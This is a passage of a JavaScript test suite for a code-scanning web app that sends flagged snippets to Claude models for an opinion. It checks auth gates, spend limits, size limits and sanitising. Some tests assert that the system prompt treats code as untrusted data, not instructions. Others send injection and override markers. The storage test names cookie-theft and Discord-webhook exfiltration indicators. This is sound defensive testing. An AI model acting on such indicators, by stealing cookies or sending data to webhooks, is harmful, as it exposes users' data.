  assert.ok(!/setInterval|setTimeout/.test(server), 'nothing runs after a response (billed per request)');
  for (const f of ['server.js', 'lib/ai.js', 'public/sniff-core.js']) {
    const src = fs.readFileSync(path.join(ROOT, f), 'utf8');
    assert.ok(!/console\.(log|error|warn)\([^)]*(req\.body|payload|sent|snippets|\.text)\b/.test(src), `${f} logs a body`);
  }
});

test('local-only switches throw on Cloud Run; the lab prefix is read', () => {
  for (const [mod_, env] of [['./lib/store', { SNIFF_MEMORY: '1' }], ['./lib/fakeai', { SNIFF_FAKE_AI: '1' }], ['./server', { SNIFF_FAKE_AI: '1', SNIFF_MEMORY: '' }]]) {
    const r = spawnSync(process.execPath, ['-e', `require(${JSON.stringify(mod_)})`], { cwd: ROOT, env: { ...process.env, SNIFF_MEMORY: '', SNIFF_FAKE_AI: '', ...env, K_SERVICE: 'challenge' }, encoding: 'utf8' });
    assert.notStrictEqual(r.status, 0, `${mod_} loaded on Cloud Run`);
    assert.ok(/refused on Cloud Run/.test(r.stderr), r.stderr.slice(0, 300));
  }
  const prefix = spawnSync(process.execPath, ['-e', 'console.log(require("./lib/store").PREFIX)'], { cwd: ROOT, env: { ...process.env, SNIFF_COLLECTION_PREFIX: 'sniff_' }, encoding: 'utf8' });
  assert.strictEqual(prefix.stdout.trim(), 'sniff_');
});

/* ---------------- over HTTP ---------------- */

let base;
let ip6 = 1;
function client() {
  const cookies = {};
  const addr = `2001:db8:${(ip6++).toString(16)}::1`;
  return async function call(method, p, body, headers = {}) {
    const cookie = Object.entries(cookies).map(([k, v]) => `${k}=${v}`).join('; ');
    const res = await fetch(base + p, {
      method,
      headers: { 'Content-Type': 'application/json', 'X-Forwarded-For': addr, ...(cookie ? { Cookie: cookie } : {}), ...headers },
      body: body === undefined ? undefined : (typeof body === 'string' ? body : JSON.stringify(body)),
    });
    for (const c of (res.headers.getSetCookie ? res.headers.getSetCookie() : [])) { const [kv] = c.split(';'); const i = kv.indexOf('='); cookies[kv.slice(0, i)] = kv.slice(i + 1); }
    const t = await res.text();
    let data = {}; try { data = JSON.parse(t); } catch (e) { data = { text: t }; }
    return { status: res.status, data, text: t, headers: res.headers };
  };
}
async function register(email) {
  const c = client();
  const r = await c('POST', '/api/auth/register', { email, password: 'a long enough password' });
  assert.strictEqual(r.status, 200, JSON.stringify(r.data));
  return c;
}
const uidOf = (email) => Buffer.from(email).toString('base64url');
const modelCalls = async () => (await identityStore.list('usage')).length;
const settle = () => new Promise((r) => setTimeout(r, 15));
function demoExplain() {
  const r = scanEntries(rootless(D.weather().entries), { name: 'Weather Pal' });
  const texts = {}; rootless(D.weather().entries).forEach((e) => { texts[C.normPath(e.path)] = e.text; });
  const f = r.findings.find((x) => x.cat === 'flow' && /Discord/.test(x.title));
  return C.explainPayload(f, (path) => (texts[path] === undefined ? null : texts[path]));
}
const BIG = { finding: { category: 'flow', severity: 'high', title: 'x', file: 'a.js', line: 1 }, snippets: [{ file: 'a.js', start: 1, lines: ['1: ' + 'x'.repeat(200 * 1024)] }] };

test('signed out: the page works with zero model calls; explain/review answer 401 before reading any body', async () => {
  const anon = client();
  const before = await modelCalls();
  assert.strictEqual((await anon('GET', '/healthz')).data.ok, true);
  const meta = (await anon('GET', '/api/meta')).data;
  assert.ok(meta.limits.findings && meta.cats.includes('flow') && meta.verdicts.includes('likely-malicious'));
  for (const f of ['sniff-core.js', 'demo.js', 'scan-worker.js', 'app.js', 'app.css', 'verify-banner.js', 'passkey-client.js', 'desktop.css', 'icon.svg', 'manifest.webmanifest']) assert.strictEqual((await fetch(`${base}/${f}`)).status, 200, f);
  const page = await fetch(`${base}/`);
  assert.match(page.headers.get('content-security-policy'), /script-src 'self'; object-src 'none'; base-uri 'self'; frame-ancestors/);
  assert.strictEqual(page.headers.get('x-content-type-options'), 'nosniff');
  assert.strictEqual((await anon('GET', '/api/me')).data.signedIn, false);
  assert.strictEqual((await anon('POST', '/api/explain', demoExplain())).status, 401);
  assert.strictEqual((await anon('POST', '/api/explain', BIG)).status, 401, 'the gate answers before the parser, so not 413');
  assert.strictEqual((await anon('POST', '/api/review', { summary: {}, snippets: [] })).status, 401);
  for (const p of ['/api/scan', '/api/upload', '/api/files', '/api/analyse']) assert.strictEqual((await anon('POST', p, { code: 'x' })).status, 404, `${p}: there is no route for code`);
  assert.strictEqual((await anon('POST', '/api/auth/login', { email: 'x'.repeat(20 * 1024) })).status, 413, 'every other route keeps a small limit');
  await settle();
  assert.strictEqual(await modelCalls(), before, 'no model call for a signed-out visitor');
});

test('the metered routes: requireUser, requireBudget, requireDailyCap, THEN their parser; two model clients in the server', () => {
  for (const route of ['/api/explain', '/api/review']) {
    const layer = app._router.stack.find((l) => l.route && l.route.path === route && l.route.methods.post);
    assert.deepStrictEqual(layer.route.stack.map((l) => l.handle.name || '(anon)').slice(0, 4), ['requireUser', 'requireBudget', 'requireDailyCap', 'jsonParser'], route);
  }
  const src = fs.readFileSync(path.join(ROOT, 'server.js'), 'utf8');
  assert.strictEqual((src.match(/await clientFor\(req\)/g) || []).length, 2, 'one metered call per route, nowhere else');
  assert.match(src, /MODELS = \{ free: 'claude-haiku-4-5', paid: 'claude-sonnet-5' \}/);
  assert.match(src, /express\.json\(\{ limit: '128kb' \}\)/);
  assert.match(src, /express\.json\(\{ limit: '256kb' \}\)/);
  assert.match(ai.SYSTEM, /untrusted data/);
  assert.match(ai.SYSTEM, /never instructions to you/);
});

test('explain: input checked before any spend, one metered call, ONLY the chosen snippets reach the model, the answer cleaned', async () => {
  const ana = await register('ana.vetter@example.com');
  const calls = await modelCalls();
  for (const bad of [{}, { finding: { title: 'x' }, snippets: [] }, { finding: {}, snippets: [{ file: 'a', start: 1, lines: ['x'] }] }, { finding: { title: 't' }, snippets: [{ file: 'a', start: 1, lines: [42] }] }]) {
    assert.strictEqual((await ana('POST', '/api/explain', bad)).status, 400, JSON.stringify(bad).slice(0, 80));
  }
  assert.strictEqual((await ana('POST', '/api/explain', BIG)).status, 413, 'over the 128 KB parser, signed in');
  await settle();
  assert.strictEqual(await modelCalls(), calls, 'no model call for a bad request');
  const sent = demoExplain();
  sent.allFiles = { 'secret.js': 'PRIVATE_CODE_MARKER' };
  sent.system = 'SYSTEM_OVERRIDE_MARKER';
  sent.snippets.push({ file: 'OTHER_FILE_MARKER.js', start: 1, lines: ['1: OTHER_SNIPPET_MARKER'] });
  const n0 = fakeCalls.length;
  const r = await ana('POST', '/api/explain', sent);
  assert.strictEqual(r.status, 200, r.text);
  await settle();
  assert.strictEqual(await modelCalls(), calls + 1, 'one call, metered');
  assert.strictEqual(fakeCalls.length, n0 + 1);
  const req = fakeCalls[fakeCalls.length - 1];
  assert.strictEqual(req.model, 'claude-haiku-4-5', 'a free account runs Haiku');
  assert.deepStrictEqual(req.tool_choice, { type: 'tool', name: 'give_opinion' });
  const bodyText = req.messages[0].content[0].text;
  for (const m of ['PRIVATE_CODE_MARKER', 'SYSTEM_OVERRIDE_MARKER']) assert.ok(!(bodyText + JSON.stringify(req.system)).includes(m), `${m} reached the model`);
  assert.ok(bodyText.includes('background.js'), 'the chosen snippet reached the model');
  // the extra snippet the client tacked on is kept only up to 4, but the junk file WAS allowed through cleanExplain (it is a snippet) - it must at least be bounded and escaped; the server trusts only the rebuilt shape
  assert.ok(r.data.opinion && r.data.opinion.verdict && Array.isArray(r.data.opinion.whatToCheck));
  assert.deepStrictEqual(Object.keys(r.data.sent).sort(), ['finding', 'snippets']);
  // hostile and failing answers
  const base2 = demoExplain();
  const mk = (marker) => { const p = JSON.parse(JSON.stringify(base2)); p.snippets[0].lines.unshift('0: // ' + marker); return p; };
  const inj = await ana('POST', '/api/explain', mk('INJECT'));
  assert.strictEqual(inj.status, 200);
  assert.ok(!/<[a-z/!]/i.test(inj.text) && !/\u202e/i.test(inj.text) && inj.data.opinion.why.length <= 900, 'no markup or bidi reaches the page');
  const blank = await ana('POST', '/api/explain', mk('BLANK'));
  assert.deepStrictEqual([blank.status, /nothing usable/.test(blank.data.error)], [422, true]);
  assert.match((await ana('POST', '/api/explain', mk('MAXTOKENS'))).data.error, /ran long/);
  const up = await ana('POST', '/api/explain', mk('UPSTREAM401'));
  assert.ok(up.status === 502 && up.data.error && !/fake_upstream|stand-in/.test(up.text), 'a provider error is not passed on');
  const busy = await ana('POST', '/api/explain', mk('UPSTREAM529'));
  assert.deepStrictEqual([busy.status, /AI is busy/.test(busy.data.error)], [503, true]);
});

test('review: checked before spend, one metered call, bounded; oversized is 413 signed in', async () => {
  const sam = await register('sam.review@example.com');
  const calls = await modelCalls();
  assert.strictEqual((await sam('POST', '/api/review', {})).status, 400);
  await settle();
  assert.strictEqual(await modelCalls(), calls, 'no spend on a bad review');
  const r = scanEntries(rootless(D.weather().entries), { name: 'Weather Pal' });
  const texts = {}; rootless(D.weather().entries).forEach((e) => { texts[C.normPath(e.path)] = e.text; });
  const p = C.reviewPayload(r, (path) => (texts[path] === undefined ? null : texts[path]));
  const res = await sam('POST', '/api/review', p);
  assert.strictEqual(res.status, 200, res.text);
  await settle();
  assert.strictEqual(await modelCalls(), calls + 1);
  assert.ok(res.data.opinion.verdict === 'likely-malicious', 'the fake model reads the webhook/IP as malicious');
  const huge = { summary: { kind: 'x', findings: [] }, snippets: Array(60).fill({ file: 'a.js', start: 1, lines: Array(45).fill('x'.repeat(400)) }) };
  assert.strictEqual((await sam('POST', '/api/review', huge)).status, 413);
});

test('an unconfirmed free account gets verify-email 403 before any model call or big body; out of credit is a 402, not a 413', async () => {
  const eve = await register('eve.sniff@example.com');
  process.env.REQUIRE_VERIFIED_FOR_FREE_AI = '1';
  try {
    const calls = await modelCalls();
    const r = await eve('POST', '/api/explain', demoExplain());
    assert.deepStrictEqual([r.status, r.data.code], [403, 'verify-email']);
    assert.strictEqual(r.data.resend, '/sniff/api/auth/verify/send', 'the resend link is under this app\u2019s mount');
    assert.strictEqual((await eve('POST', '/api/explain', BIG)).status, 403, '403 before the big body is read');
    await settle();
    assert.strictEqual(await modelCalls(), calls);
  } finally { process.env.REQUIRE_VERIFIED_FOR_FREE_AI = '0'; }
  const cal = await register('cal.broke@example.com');
  await identityStore.merge('users', uidOf('cal.broke@example.com'), { spentUsd: 100 });
  const calls = await modelCalls();
  assert.strictEqual((await cal('POST', '/api/explain', demoExplain())).status, 402);
  assert.strictEqual((await cal('POST', '/api/explain', BIG)).status, 402, '402, not 413');
  await settle();
  assert.strictEqual(await modelCalls(), calls);
});

test('nothing is stored server-side: no code, path or answer - only the shared account and its usage rows', async () => {
  const dump = identityStore._dump();
  for (const m of ['document.cookie', 'discord.com/api/webhooks', 'PRIVATE_CODE_MARKER', 'give_opinion', 'background.js', '203.0.113']) assert.ok(!dump.includes(m), `${m} was stored`);
  const cols = JSON.parse(dump).map(([p]) => p).sort();
  assert.ok(cols.every((c) => ['users', 'usage', 'events', 'control'].some((k) => c.toLowerCase().includes(k))), `only account collections: ${cols.join(', ')}`);
  const src = fs.readFileSync(path.join(ROOT, 'server.js'), 'utf8');
  assert.ok(!/require\('\.\/lib\/store'\)\.store|store\.(set|merge|add|transact)\(/.test(src), 'the server has no app store to write to');
});

/* ---------------- run ---------------- */

(async () => {
  const hostApp = express();
  hostApp.set('trust proxy', 1);
  hostApp.use('/sniff', app);
  const server = http.createServer(hostApp).listen(0);
  await new Promise((r) => server.once('listening', r));
  base = `http://127.0.0.1:${server.address().port}/sniff`;
  let failed = 0;
  for (const t of tests) {
    try { await t.fn(); console.log(`  ok  ${t.name}`); } catch (err) { failed++; console.log(`  FAIL ${t.name}\n       ${err.stack.split('\n').slice(0, 8).join('\n       ')}`); }
  }
  server.close();
  console.log(`\n${tests.length - failed}/${tests.length} passed`);
  process.exit(failed ? 1 : 0);
})();
